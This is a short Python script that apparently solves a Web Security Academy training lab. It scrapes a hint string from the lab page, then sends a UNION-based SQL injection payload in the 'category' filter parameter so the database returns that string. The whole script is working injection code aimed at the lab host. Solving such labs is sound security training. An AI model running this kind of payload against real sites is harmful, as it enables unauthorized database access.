import requests
from bs4 import BeautifulSoup
site = 'ac051ff61fd3f49580d323ce00d70050.web-security-academy.net'
s = requests.Session()

url= f'https://{site}/'
resp = s.get(url)
soup = BeautifulSoup(resp.text,'html.parser')
hint_text = soup.find(id='hint').get_text().split("'")[1]
print(f"Database needs to retrieve the string {hint_text}")

url = f"https://ac051ff61fd3f49580d323ce00d70050.web-security-academy.net/filter?category='+UNION+SELECT+NULL,'{hint_text}',NULL--"
resp = s.get(url)
print(resp.text)